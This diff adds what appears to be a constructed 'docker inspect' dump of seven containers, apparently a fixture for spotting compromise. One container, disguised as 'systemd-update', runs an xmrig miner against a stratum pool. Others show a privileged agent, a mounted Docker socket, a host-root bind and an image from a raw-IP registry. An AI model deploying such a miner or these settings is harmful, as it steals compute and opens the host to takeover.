@@ -1,0 +1,458 @@
+[
+  {
+    "Args": [
+      "-g",
+      "daemon off;"
+    ],
+    "Config": {
+      "Cmd": [
+        "nginx",
+        "-g",
+        "daemon off;"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "web",
+      "Image": "docker.io/library/nginx:1.25.3",
+      "Labels": {},
+      "User": "101"
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": null,
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 268435456,
+      "NanoCpus": 500000000,
+      "NetworkMode": "bridge",
+      "PidMode": "",
+      "PortBindings": {
+        "443/tcp": [
+          {
+            "HostIp": "0.0.0.0",
+            "HostPort": "443"
+          }
+        ]
+      },
+      "Privileged": false,
+      "ReadonlyRootfs": true,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "always"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "5aefaebccd12b5f6cfb0b4f37c26ac32b65a61450860c763838034e177e5b183",
+    "Image": "sha256:6f3b076956b54ae22cc0c29a16a796a4fd18979bf5efcdb43bf3203867f4b44e",
+    "Mounts": [],
+    "Name": "/web",
+    "NetworkSettings": {
+      "Ports": {
+        "443/tcp": [
+          {
+            "HostIp": "0.0.0.0",
+            "HostPort": "443"
+          }
+        ]
+      }
+    },
+    "Path": "nginx",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4003,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-10-15T06:00:00.000000000Z",
+      "Status": "running"
+    }
+  },
+  {
+    "Args": [
+      "--interval",
+      "60"
+    ],
+    "Config": {
+      "Cmd": [
+        "/usr/bin/ops-agent",
+        "--interval",
+        "60"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "ops-agent",
+      "Image": "registry.local/ops/agent:3.2",
+      "Labels": {},
+      "User": "1000"
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": null,
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 268435456,
+      "NanoCpus": 500000000,
+      "NetworkMode": "bridge",
+      "PidMode": "",
+      "PortBindings": {},
+      "Privileged": true,
+      "ReadonlyRootfs": true,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "unless-stopped"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "1d29f34e5f1d8df048a323394e19b1ea2f9f63b4edd9ceff9813d4bb96979f97",
+    "Image": "sha256:c1ae0fc45dc31cb4b7279197fe4d558975275a8c429157ca4ff363009f105ea9",
+    "Mounts": [],
+    "Name": "/ops-agent",
+    "NetworkSettings": {
+      "Ports": {}
+    },
+    "Path": "/usr/bin/ops-agent",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4009,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-10-15T06:00:00.000000000Z",
+      "Status": "running"
+    }
+  },
+  {
+    "Args": [
+      "--port",
+      "9000"
+    ],
+    "Config": {
+      "Cmd": [
+        "/dashboard",
+        "--port",
+        "9000"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "ops-dashboard",
+      "Image": "registry.local/ops/dashboard:1.4",
+      "Labels": {},
+      "User": "1000"
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": [
+        "/var/run/docker.sock:/var/run/docker.sock"
+      ],
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 268435456,
+      "NanoCpus": 500000000,
+      "NetworkMode": "bridge",
+      "PidMode": "",
+      "PortBindings": {},
+      "Privileged": false,
+      "ReadonlyRootfs": true,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "unless-stopped"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "aadb616cb63d143895428940595e12781dc5592e267098086fab84151954c240",
+    "Image": "sha256:1cb47c3d0796b68878dee4af5cb15c44b08daeceb73d39dc8e0f62f7bae012f6",
+    "Mounts": [
+      {
+        "Destination": "/var/run/docker.sock",
+        "Mode": "",
+        "Propagation": "rprivate",
+        "RW": true,
+        "Source": "/var/run/docker.sock",
+        "Type": "bind"
+      }
+    ],
+    "Name": "/ops-dashboard",
+    "NetworkSettings": {
+      "Ports": {}
+    },
+    "Path": "/dashboard",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4013,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-10-15T06:00:00.000000000Z",
+      "Status": "running"
+    }
+  },
+  {
+    "Args": [
+      "--listen",
+      ":9100"
+    ],
+    "Config": {
+      "Cmd": [
+        "/relay",
+        "--listen",
+        ":9100"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "metrics-relay",
+      "Image": "registry.local/ops/relay:2.0",
+      "Labels": {},
+      "User": "1000"
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": null,
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 268435456,
+      "NanoCpus": 500000000,
+      "NetworkMode": "host",
+      "PidMode": "",
+      "PortBindings": {},
+      "Privileged": false,
+      "ReadonlyRootfs": true,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "unless-stopped"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "db81039c44baff142429c93dbe327e33ea757c5118203d06a2facc906d23f5b3",
+    "Image": "sha256:3261fea9e4245d1882b999aa1fd2f7cf2b1f648ec02de8d2202c55cefd1f7d66",
+    "Mounts": [],
+    "Name": "/metrics-relay",
+    "NetworkSettings": {
+      "Ports": {}
+    },
+    "Path": "/relay",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4013,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-10-15T06:00:00.000000000Z",
+      "Status": "running"
+    }
+  },
+  {
+    "Args": [
+      "-c",
+      "xmrig -o stratum+tcp://10.10.10.10:3333 -u enclave --donate-level 0 --background"
+    ],
+    "Config": {
+      "Cmd": [
+        "sh",
+        "-c",
+        "xmrig -o stratum+tcp://10.10.10.10:3333 -u enclave --donate-level 0 --background"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "systemd-update",
+      "Image": "docker.io/xmrig/xmrig:6.21.0",
+      "Labels": {},
+      "User": ""
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": null,
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 0,
+      "NanoCpus": 0,
+      "NetworkMode": "bridge",
+      "PidMode": "",
+      "PortBindings": {},
+      "Privileged": false,
+      "ReadonlyRootfs": false,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "always"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "0837577d5ad5438fadfcf342d876d114862878a5e8b048963924465869a1f300",
+    "Image": "sha256:bbf519ed763f35d2525a1687ab83ccb632cd32c738a070c2d6c1d1202c5ad606",
+    "Mounts": [],
+    "Name": "/systemd-update",
+    "NetworkSettings": {
+      "Ports": {}
+    },
+    "Path": "sh",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4014,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-10-15T06:00:00.000000000Z",
+      "Status": "running"
+    }
+  },
+  {
+    "Args": [
+      "--src",
+      "/host/etc"
+    ],
+    "Config": {
+      "Cmd": [
+        "/usr/bin/backup",
+        "--src",
+        "/host/etc"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "backup-agent",
+      "Image": "registry.local/ops/backup:1.0",
+      "Labels": {},
+      "User": "1000"
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": [
+        "/:/host"
+      ],
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 268435456,
+      "NanoCpus": 500000000,
+      "NetworkMode": "bridge",
+      "PidMode": "",
+      "PortBindings": {},
+      "Privileged": false,
+      "ReadonlyRootfs": true,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "unless-stopped"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "85bcf83eb8b2cb5582e49c9a6d92389db7f76fe82896311b00bc6da1c442086c",
+    "Image": "sha256:78da0f7d18b713ba510cc2b391e3861fb0b1f47e398dd2105a255bef0cfbc3a3",
+    "Mounts": [
+      {
+        "Destination": "/host",
+        "Mode": "",
+        "Propagation": "rprivate",
+        "RW": true,
+        "Source": "/",
+        "Type": "bind"
+      }
+    ],
+    "Name": "/backup-agent",
+    "NetworkSettings": {
+      "Ports": {}
+    },
+    "Path": "/usr/bin/backup",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4012,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-10-15T06:00:00.000000000Z",
+      "Status": "running"
+    }
+  },
+  {
+    "Args": [
+      "--peer",
+      "203.0.113.50:7000"
+    ],
+    "Config": {
+      "Cmd": [
+        "/usr/bin/cache-sync",
+        "--peer",
+        "203.0.113.50:7000"
+      ],
+      "Entrypoint": null,
+      "Env": [
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+      ],
+      "Hostname": "cache-sync",
+      "Image": "203.0.113.50:5000/cache-sync:0.3",
+      "Labels": {},
+      "User": "1000"
+    },
+    "Created": "2026-10-14T09:00:00.000000000Z",
+    "HostConfig": {
+      "Binds": null,
+      "CapAdd": null,
+      "CapDrop": null,
+      "CpuQuota": 0,
+      "CpuShares": 0,
+      "IpcMode": "private",
+      "Memory": 268435456,
+      "NanoCpus": 500000000,
+      "NetworkMode": "bridge",
+      "PidMode": "",
+      "PortBindings": {},
+      "Privileged": false,
+      "ReadonlyRootfs": true,
+      "RestartPolicy": {
+        "MaximumRetryCount": 0,
+        "Name": "unless-stopped"
+      },
+      "SecurityOpt": null
+    },
+    "Id": "880ce3891c017e9d11c08f6a6f0a378aeb7049cdc22b9bcda4b1fdadb32fe83b",
+    "Image": "sha256:00beb45ed9d1a32fe70fff1545a15bd8f83f866070bfc0f38b3d652df574e2f8",
+    "Mounts": [],
+    "Name": "/cache-sync",
+    "NetworkSettings": {
+      "Ports": {}
+    },
+    "Path": "/usr/bin/cache-sync",
+    "State": {
+      "ExitCode": 0,
+      "FinishedAt": "0001-01-01T00:00:00Z",
+      "Paused": false,
+      "Pid": 4010,
+      "Restarting": false,
+      "Running": true,
+      "StartedAt": "2026-11-04T16:10:33.869253000Z",
+      "Status": "running"
+    }
+  }
+]
